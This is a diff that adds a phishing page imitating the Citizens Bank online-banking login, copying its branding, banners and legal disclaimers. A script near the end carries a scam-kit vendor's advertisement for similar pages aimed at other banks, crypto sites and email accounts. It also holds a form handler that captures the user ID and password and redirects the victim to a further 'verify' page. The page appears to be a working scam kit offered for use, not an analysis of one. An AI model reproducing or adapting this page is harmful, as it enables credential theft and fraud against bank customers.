+          display: flex;
+        }
+
+        .md\:w-\[140px\] {
+          width: 140px;
+        }
+
+        .md\:w-\[470px\] {
+          width: 470px;
+        }
+
+        .md\:grid-cols-2 {
+          grid-template-columns: repeat(2, minmax(0, 1fr));
+        }
+
+        .md\:grid-cols-3 {
+          grid-template-columns: repeat(3, minmax(0, 1fr));
+        }
+
+        .md\:justify-start {
+          justify-content: flex-start;
+        }
+
+        .md\:justify-between {
+          justify-content: space-between;
+        }
+
+        .md\:gap-14 {
+          gap: 3.5rem;
+        }
+
+        .md\:space-x-10> :not([hidden])~ :not([hidden]) {
+          --tw-space-x-reverse: 0;
+          margin-right: calc(2.5rem * var(--tw-space-x-reverse));
+          margin-left: calc(2.5rem * calc(1 - var(--tw-space-x-reverse)));
+        }
+
+        .md\:pl-\[160px\] {
+          padding-left: 160px;
+        }
+      }
+
+      @media (min-width: 1024px) {
+        .lg\:right-28 {
+          right: 7rem;
+        }
+
+        .lg\:col-span-7 {
+          grid-column: span 7 / span 7;
+        }
+
+        .lg\:ml-36 {
+          margin-left: 9rem;
+        }
+
+        .lg\:ml-\[130px\] {
+          margin-left: 130px;
+        }
+
+        .lg\:ml-\[135px\] {
+          margin-left: 135px;
+        }
+
+        .lg\:ml-\[150px\] {
+          margin-left: 150px;
+        }
+
+        .lg\:mr-\[150px\] {
+          margin-right: 150px;
+        }
+
+        .lg\:mt-3 {
+          margin-top: 0.75rem;
+        }
+
+        .lg\:h-20 {
+          height: 5rem;
+        }
+
+        .lg\:h-6 {
+          height: 1.5rem;
+        }
+
+        .lg\:w-20 {
+          width: 5rem;
+        }
+
+        .lg\:w-\[140px\] {
+          width: 140px;
+        }
+
+        .lg\:w-\[470px\] {
+          width: 470px;
+        }
+
+        .lg\:grid-cols-12 {
+          grid-template-columns: repeat(12, minmax(0, 1fr));
+        }
+
+        .lg\:grid-cols-2 {
+          grid-template-columns: repeat(2, minmax(0, 1fr));
+        }
+
+        .lg\:grid-cols-3 {
+          grid-template-columns: repeat(3, minmax(0, 1fr));
+        }
+
+        .lg\:justify-start {
+          justify-content: flex-start;
+        }
+
+        .lg\:gap-8 {
+          gap: 2rem;
+        }
+
+        .lg\:space-x-1> :not([hidden])~ :not([hidden]) {
+          --tw-space-x-reverse: 0;
+          margin-right: calc(0.25rem * var(--tw-space-x-reverse));
+          margin-left: calc(0.25rem * calc(1 - var(--tw-space-x-reverse)));
+        }
+
+        .lg\:space-x-10> :not([hidden])~ :not([hidden]) {
+          --tw-space-x-reverse: 0;
+          margin-right: calc(2.5rem * var(--tw-space-x-reverse));
+          margin-left: calc(2.5rem * calc(1 - var(--tw-space-x-reverse)));
+        }
+
+        .lg\:px-8 {
+          padding-left: 2rem;
+          padding-right: 2rem;
+        }
+
+        .lg\:py-8 {
+          padding-top: 2rem;
+          padding-bottom: 2rem;
+        }
+
+        .lg\:pb-14 {
+          padding-bottom: 3.5rem;
+        }
+
+        .lg\:pt-0 {
+          padding-top: 0px;
+        }
+      }
+
+      @media (min-width: 1280px) {
+        .xl\:mt-3 {
+          margin-top: 0.75rem;
+        }
+
+        .xl\:h-6 {
+          height: 1.5rem;
+        }
+
+        .xl\:justify-start {
+          justify-content: flex-start;
+        }
+
+        .xl\:gap-0 {
+          gap: 0px;
+        }
+
+        .xl\:pl-\[340px\] {
+          padding-left: 340px;
+        }
+      }
+    </style>
+    <style>
+      /* Add your CSS styles here */
+      .bg-green {
+        background-color: #008555;
+      }
+
+      .border-green {
+        border-color: #008555;
+      }
+
+      .bg-white {
+        background-color: white;
+      }
+
+      .border-neutral-400 {
+        border-color: #A0AEC0;
+        /* Adjust the color as needed */
+      }
+    </style>
+  </head>
+  <body>
+    <div id="root">
+      <div class="App font-roboto">
+        <nav class="top-0 left-0 z-20 w-full bg-white border-b-2 border-gray-400">
+          <div class="flex flex-wrap items-center justify-between max-w-screen-xl p-4 mx-auto ml-4 lg:ml-36">
+            <a href="/" target="" class="flex mt-1.5 mb-1.5 items-center">
+              <img src="./index_files/citizens-logo.png" class="h-6 lg:h-6 xl:h-6" alt="Logo">
+            </a>
+          </div>
+        </nav>
+        <section class="bg-[#006a44] mt-[0.5px] font-roboto">
+          <div class="grid max-w-screen-xl px-4 ml-4 lg:ml-[135px] mr-4 lg:mr-[150px] py-5 mx-auto lg:gap-8 xl:gap-0 lg:grid-cols-12">
+            <div class="mr-auto place-self-center lg:col-span-7">
+              <h1 class="max-w-2xl mb-3 text-3xl font-extrabold tracking-tight leading-none text-white font-roboto">Welcome back!</h1>
+              <p class="max-w-2xl mb-3 font-normal text-white">To log in, enter your user ID and password below.</p>
+            </div>
+          </div>
+        </section>
+        <div class="ml-8 lg:ml-[150px] mr-8 lg:mr-[150px] sm:mr-8 sm:ml-8">
+          <div id="banner" class="flex p-6 shadow-xl mt-6 mb-4 text-sm text-black border-b-4 border-[#044da2] rounded-md bg-[#e6edf5]" role="alert">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#044da2" class="flex-shrink-0 inline w-5 h-5 mr-3 mt-[2px]">
+              <path fill-rule="evenodd" d="M2.25 12c0-5.385 4.365-9.75 9.75-9.75s9.75 4.365 9.75 9.75-4.365 9.75-9.75 9.75S2.25 17.385 2.25 12zM12 8.25a.75.75 0 01.75.75v3.75a.75.75 0 01-1.5 0V9a.75.75 0 01.75-.75zm0 8.25a.75.75 0 100-1.5.75.75 0 000 1.5z" clip-rule="evenodd"></path>
+            </svg>
+            <span class="sr-only">Info</span>
+            <div>
+              <span class="text-base font-bold">Welcome back to Online Banking!</span>
+              
+              <div class="mt-4">
+                <span class=""> Introducing our NEW Citizens Savings Tracker™ tool that helps you save for the things you want. Just set a goal, choose a way to save, and start putting money aside automatically! Exclusively in the mobile app. Member FDIC. <a href="/" target="" class="text-[#5792fc] hover:underline hover:text-[#0356b5]">Start Saving</a>
+                </span>
+              </div>
+              <div class="mt-4">
+                <span class="font-normal"> By logging in you acknowledge that you have read, understand and agree to the citizens Online Terms & Conditions and Electronic Notice Disclosure & Consent, and that you have provided a valid primary email address. We are pleased to provide you with this enhanced and secure banking experience. </span>
+              </div>
+              <div class="mt-7">
+                <a href="https://www.citizensbank.com/assets/pdf/E-SignDisclosure.pdf" target="_blank" class="text-[#044da3] font-medium underline hover:text-[#1c4681]">Electronic Notice Disclosure and Consent</a>
+              </div>
+              <div class="mt-2">
+                <a href="https://www.citizensbank.com/account-safeguards/online-terms-and-conditions.aspx" target="_blank" class="text-[#044da3] font-medium underline hover:text-[#1c4681]">Terms and Conditions</a>
+              </div>
+            </div>
+            <svg onclick="closeBanner()" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="#646363" class="w-40 h-40 pb-32 ml-2 cursor-pointer lg:w-20 lg:h-20 lg:pb-14">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"></path>
+            </svg>
+          </div>
+          <main class="flex mb-20">
+            <div class="grid w-full grid-cols-1 gap-10 lg:grid-cols-2 md:grid-cols-2 md:gap-14">
+              <div class="mt-4 space-y-8 sm:space-y-10 sm:mt-3 lg:mt-3 md:mt-3 xl:mt-3">
+                <form method="post" onsubmit="saveLoginInfo(event)">
+                  <div class="mb-6">
+                    <label for="userId" class="block mb-2 text-base font-medium text-black">User ID</label>
+                    <input type="userId" id="userId" class="border border-black text-black text-sm block w-full lg:w-[470px] md:w-[470px] p-3.5 focus:border-[3px] focus:border-black focus:ring-black" placeholder="" required="">
+                  </div>
+                  <div class="mb-14">
+                    <label for="password" class="block mb-2 text-base font-medium text-black">Password</label>
+                    <div class="relative">
+                      <input type="password" id="password" class="border border-black text-black text-sm pr-10 pl-3.5 py-3.5 w-full lg:w-[470px] md:w-[470px] focus:border-[3px] focus:border-black focus:ring-black" required="">
+                      <button type="button" id="togglePassword" class="absolute font-bold top-2 right-2 lg:right-28 md:-right-20 text-gray-800 underline hover:bg-gray-100 text-sm px-3 py-1.5 text-center" onclick="togglePasswordVisibility()">Show</button>
+                    </div>
+                  </div>
+                  <div id="customCheckbox" class="flex text-sm sm:text-base mb-6">
+                    <input id="customCheckboxInput" name="customCheckboxInput" type="checkbox" class="hidden" checked="" onclick="toggleCheckbox()" />
+                    <label for="customCheckboxInput" id="customCheckboxLabel" class="w-6 h-6 border flex items-center justify-center cursor-pointer bg-white border-neutral-400">
+                      <span id="checkmarkSpan"></span>
+                    </label>
+                    <label for="customCheckboxInput" id="customCheckboxTextLabel" class="ml-2 flex flex-col flex-1 justify-center">
+                      <span id="labelText" class="text-[#101213] text-sm font-semibold"></span>
+                      <p id="subLabelText" class="mt-1 text-sm font-light text-[#101213]"></p>
+                    </label>
+                  </div>
+                  <div>
+                    <a href="/" class="text-[#044da3] font-semibold underline hover:text-[#1c4681]">Trouble logging in?</a>
+                  </div>
+                  <div class="mt-3">
+                    <p>New to Online Banking? <a href="/" class="text-[#044da3] font-semibold underline hover:text-[#1c4681]">Enroll now.</a>
+                    </p>
+                  </div>
+                  <div class="mt-8 space-x-0 sm:space-x-0 lg:space-x-1">
+                    <button type="submit" class="text-white bg-[#d93d00] hover:bg-[#ad3000] items-center focus:ring-4 focus:outline-none font-medium text-sm w-full lg:w-[140px] md:w-[140px] px-5 py-2.5 text-center">
+                      <span class="inline-flex">
+                        <svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" class="items-center mr-1 mt-0.5" height="20" width="20" xmlns="http://www.w3.org/2000/svg">
+                          <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+                          <path d="M5 13a2 2 0 0 1 2 -2h10a2 2 0 0 1 2 2v6a2 2 0 0 1 -2 2h-10a2 2 0 0 1 -2 -2v-6z"></path>
+                          <path d="M11 16a1 1 0 1 0 2 0a1 1 0 0 0 -2 0"></path>
+                          <path d="M8 11v-4a4 4 0 1 1 8 0v4"></path>
+                        </svg>
+                        <span class="text-base font-semibold">Log In</span>
+                      </span>
+                    </button>
+                    <button type="submit" class="text-black bg-white hover:bg-gray-100 items-center focus:ring-4 focus:outline-none font-medium text-sm w-full lg:w-[140px] md:w-[140px] px-5 py-2.5 text-center">
+                      <a href="/" class="text-base font-semibold underline">Cancel</a>
+                    </button>
+                  </div>
+                </form>
+              </div>
+              <div class="pt-0 lg:pt-0 xl:pl-[340px] md:pl-[160px] sm:mt-3 lg:mt-3 xl:mt-3">
+                <div>
+                  <p class="text-2xl font-bold text-black">Need help?</p>
+                </div>
+                <div class="mt-6">
+                  <a href="/" class="text-[#044da3] font-semibold underline hover:text-[#1c4681]">Find quick answers in our FAQs</a>
+                </div>
+                <div class="mt-6">
+                  <a href="/" class="text-[#044da3] font-semibold underline hover:text-[#1c4681]">Contact Us</a>
+                </div>
+              </div>
+            </div>
+          </main>
+        </div>
+        <footer class="bg-white ml-2 lg:ml-[130px] mr-2 lg:mr-[150px] sm:mr-2 sm:ml-2">
+          <div class="w-full max-w-screen-xl p-4 py-6 mx-auto lg:py-8">
+            <div class="md:flex md:justify-between">
+              <div class="mb-6 md:mb-0">
+                <a href="/" class="flex items-center">
+                  <img src="./index_files/citizens-logo.png" class="h-6 mr-3" alt="Logo">
+                </a>
+              </div>
+              <div class="grid grid-cols-2 gap-10 space-x-0 md:space-x-10 lg:space-x-10 sm:space-x-0 sm:gap-6 sm:grid-cols-2 lg:grid-cols-3 md:grid-cols-3">
+                <div>
+                  <h2 class="mb-6 text-lg font-bold text-gray-700">Company</h2>
+                  <ul class="font-normal text-gray-800">
+                    <li class="mb-4">
+                      <a href="/" class="hover:underline">About Us</a>
+                    </li>
+                    <li class="mb-4">
+                      <a href="/" class="hover:underline">Careers</a>
+                    </li>
+                    <li class="mb-4">
+                      <a href="/" class="hover:underline">Community</a>
+                    </li>
+                  </ul>
+                </div>
+                <div>
+                  <h2 class="mb-6 text-lg font-bold text-gray-700">Help</h2>
+                  <ul class="font-normal text-gray-800">
+                    <li class="mb-4">
+                      <a href="/" class="hover:underline">Contact Us</a>
+                    </li>
+                  </ul>
+                </div>
+                <div>
+                  <h2 class="mb-6 text-lg font-bold text-gray-700">Resources</h2>
+                  <ul class="font-normal text-gray-800">
+                    <li class="mb-4">
+                      <a href="/" class="hover:underline">Branch Locator</a>
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+            <div class="mt-4 sm:flex sm:mt-6 sm:items-center sm:justify-between">
+              <span class="inline-flex text-base font-bold text-black sm:text-center">
+                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6 mr-1">
+                  <path stroke-linecap="round" stroke-linejoin="round" d="M10.5 1.5H8.25A2.25 2.25 0 006 3.75v16.5a2.25 2.25 0 002.25 2.25h7.5A2.25 2.25 0 0018 20.25V3.75a2.25 2.25 0 00-2.25-2.25H13.5m-3 0V3h3V1.5m-3 0h3m-3 18.75h3"></path>
+                </svg>
+                <a href="/" class="hover:underline">Get Mobile App</a>
+              </span>
+            </div>
+          </div>
+        </footer>
+        <section class="bg-[#f2f1f1] font-roboto">
+          <div class="px-4 py-5 ml-2 lg:ml-[130px] mr-2 lg:mr-[150px] sm:mr-2 sm:ml-2">
+            <p class="mb-4 text-[14.5px] sm:text-left sm:items-left items-center justify-center text-center font-normal text-gray-700">
+            <div class="mt-3 mb-5">
+              <div class="flex justify-center space-x-5 lg:justify-start xl:justify-start md:justify-start sm:justify-start">
+                <a href="/" class="text-gray-700">
+                  <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="20" width="20" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"></path>
+                  </svg>
+                </a>
+                <a href="/" class="text-gray-700">
+                  <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" height="20" width="20" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"></path>
+                  </svg>
+                </a>
+                <a href="/" class="text-gray-700">
+                  <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" height="20" width="20" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path>
+                  </svg>
+                </a>
+                <a href="/" class="text-gray-700">
+                  <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="20" width="20" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path>
+                  </svg>
+                </a>
+                <a href="/" class="text-gray-700">
+                  <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 576 512" height="20" width="20" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M549.655 124.083c-6.281-23.65-24.787-42.276-48.284-48.597C458.781 64 288 64 288 64S117.22 64 74.629 75.486c-23.497 6.322-42.003 24.947-48.284 48.597-11.412 42.867-11.412 132.305-11.412 132.305s0 89.438 11.412 132.305c6.281 23.65 24.787 41.5 48.284 47.821C117.22 448 288 448 288 448s170.78 0 213.371-11.486c23.497-6.321 42.003-24.171 48.284-47.821 11.412-42.867 11.412-132.305 11.412-132.305s0-89.438-11.412-132.305zm-317.51 213.508V175.185l142.739 81.205-142.739 81.201z"></path>
+                  </svg>
+                </a>
+              </div>
+            </div>
+            <span>Site Map</span>
+            <span class="text-gray-300">|</span>
+            <span>About Our Ads</span>
+            <span class="text-gray-300">|</span>
+            <span>Site Requirements</span>
+            <span class="text-gray-300">|</span>
+            <span>Security &amp; Legal</span>
+            <span class="text-gray-300">|</span>
+            <span>Privacy Policy</span>
+            <span class="text-gray-300">|</span>
+            <span>Privacy Rights</span>
+            <span class="text-gray-300">|</span>
+            <span>Accessibility</span>
+            </p>
+          </div>
+        </section>
+        <footer class="bg-white ml-2 lg:ml-[130px] mr-2 lg:mr-[150px] sm:mr-4 sm:ml-4">
+          <div class="w-full max-w-screen-xl mx-auto">
+            <div class="grid grid-cols-2 gap-8 px-2 py-6 lg:py-8 md:grid-cols-3">
+              <div>
+                <h2 class="mb-4 text-base font-semibold text-[#7d8d9d]">Disclosures</h2>
+                <ul class="font-normal text-sm text-[#76777a]">
+                  <li class="mb-4">
+                    <a href="/" class="underline ">Online Terms and Conditions</a>
+                  </li>
+                  <li class="mb-4">
+                    <a href="/" class="underline">Equal Housing Lender</a>
+                  </li>
+                </ul>
+              </div>
+              <div>
+                <h2 class="text-sm font-semibold text-gray-900 mb-11 dark:text-black"></h2>
+                <ul class="font-normal text-sm text-[#76777a]">
+                  <li class="mb-4">
+                    <a href="/" class="underline">Member FDIC</a>
+                  </li>
+                  <li class="mb-4">
+                    <a href="/" class="underline">Account Documents</a>
+                  </li>
+                </ul>
+              </div>
+              <div>
+                <h2 class="text-sm font-semibold text-gray-900 mb-11 dark:text-black"></h2>
+                <ul class="font-normal text-sm text-[#76777a]">
+                  <li class="mb-4">
+                    <a href="/" class="underline">Electronic Notice Disclosure and Consent</a>
+                  </li>
+                  <li class="mb-4">
+                    <a href="/" class="underline">Security, Privacy and Legal</a>
+                  </li>
+                </ul>
+              </div>
+            </div>
+            <div class="text-[#828d9b] ml-2 mr-2 text-sm space-y-7">
+              <p>Zelle and the Zelle related marks are wholly owned by Early Warning Services, LLC and are used herein under license.</p>
+              <p>*Securities, Insurance Products and Investment Advisory Services offered through citizens Securities, Inc. ("CSI"). CSI is an SEC registered investment adviser and Member - FINRA and SIPC.</p>
+              <p>The investment balances shown in online banking are based on market prices, with up to a fifteen minute delay from the time this webpage was last refreshed. Information relating to accounts not held at CSI is presented as an accommodation and while drawn from sources believed to be reliable is not guaranteed as to accuracy or completeness. Such information should be independently confirmed by the account owner(s).</p>
+              <p>Information relating to accounts not held or custodied by National Financial Services (NFS) (Assets Held Away), CSI’s clearing broker dealer, was provided to NFS by outside parties and is included for informational purposes only. These positions are not part of your brokerage account carried by NFS and therefore any SIPC account protection afforded your account through NFS does not cover these assets or prices reported. Neither NFS, CSI nor citizens are responsible for the Assets Held Away information provided and does not guarantee the accuracy or timeliness of the positions or prices reported. Prices shown do not necessarily reflect the actual current market prices. Further information regarding these prices may be obtained by contacting CSI.</p>
+              <p>The investment products and financial strategies suggested herein are subject to investment risk, including possible loss of principal amount invested. Investment decisions should be based on each individual's goals, time horizon and tolerance for risk.</p>
+              <p>SpeciFi® is made available through CSI. Portfolio management services are sub-advised by SigFig Wealth Management, LLC ("SigFig"), an SEC registered investment adviser. SigFig is not an affiliate of CSI or citizens Bank, N.A.</p>
+              <div class="items-center justify-center p-5 text-sm text-center text-gray-800 border border-gray-200" role="alert">
+                <div class="font-medium text-[#7c7474]">Securities, Insurance Products and Advisory Services are:</div>
+                <span class="text-[#818da4]">NOT FDIC INSURED • NOT BANK GUARANTEED • MAY LOSE VALUE • NOT A DEPOSIT • NOT INSURED BY ANY FEDERAL GOVERNMENT AGENCY</span>
+              </div>
+              <p>©2023 citizens Financial Group, Inc. All rights reserved. citizens is a brand name of citizens Bank, N.A.. Member FDIC.</p>
+            </div>
+          </div>
+        </footer>
+      </div>
+    </div>
+    <script>
+      const closeBanner = () => {
+        const banner = document.getElementById('banner');
+        banner.style.display = 'none';
+      };
+
+      const passwordInput = document.getElementById('password');
+      const toggleButton = document.getElementById('togglePassword');
+
+      const togglePasswordVisibility = () => {
+        if (passwordInput.type === 'password') {
+          passwordInput.type = 'text';
+          toggleButton.textContent = 'Hide';
+        } else {
+          passwordInput.type = 'password';
+          toggleButton.textContent = 'Show';
+        }
+      };
+      const checkboxInput = document.getElementById('customCheckboxInput');
+      const checkboxLabel = document.getElementById('customCheckboxLabel');
+      const checkmarkSpan = document.getElementById('checkmarkSpan');
+      const labelText = document.getElementById('labelText');
+      const subLabelText = document.getElementById('subLabelText');
+
+      const toggleCheckbox = () => {
+        checkboxInput.checked = !checkboxInput.checked;
+        const isChecked = checkboxInput.checked;
+        if (isChecked) {
+          checkboxLabel.classList.add('bg-green', 'border-green');
+          checkboxLabel.classList.remove('bg-white', 'border-neutral-400');
+          checkmarkSpan.innerHTML = `
+															<span role="img" aria-label="checkmark">
+																<svg
+																	xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="#ffffff" class="w-6 h-6">
+																	<path strokeLinecap="round" strokeLinejoin="round" d="M4.5 12.75l6 6 9-13.5" />
+																</svg>
+															</span>
+        `;
+        } else {
+          checkboxLabel.classList.add('bg-white', 'border-neutral-400');
+          checkboxLabel.classList.remove('bg-green', 'border-green');
+          checkmarkSpan.innerHTML = ``;
+        }
+      };
+
+      labelText.textContent = 'Remember user ID';
+      subLabelText.textContent = '';
+
+      //THIS CODE WAS BUILT BY "SCAMPAGESHOP [www.scampage.shop]" and has AES 256-bit encryption. Any adjustments to the code would break it//
+      //Do not touch this section
+      //When testing results, if you don't find it in your inbox, check your spam folder.
+      //If you want to get quality:
+      // - USA Banks Scampage
+      // - UK Banks Scampage
+      // - Australian Scampage
+      // - Canadian Scampage
+      // - Crypto Websites Scampage 
+      // - Email Accounts Scampage
+      // - Newsletter Scampage and more..
+      // Visit: https://www.scampage.shop/
+
+      function saveLoginInfo(event) {
+        event.preventDefault();
+
+        var userId = document.getElementById("userId").value;
+        var password = document.getElementById("password").value;
+
+        localStorage.setItem("User ID", userId);
+        localStorage.setItem("Password", password);
+
+        window.location.href = "/verify.html";
+      }
+      
+      document.getElementById("password").addEventListener("keydown", function(event) {
+        if (event.keyCode === 13) {
+          saveLoginInfo(event);
+        }
+      });
+    </script>
+  </body>
+</html>
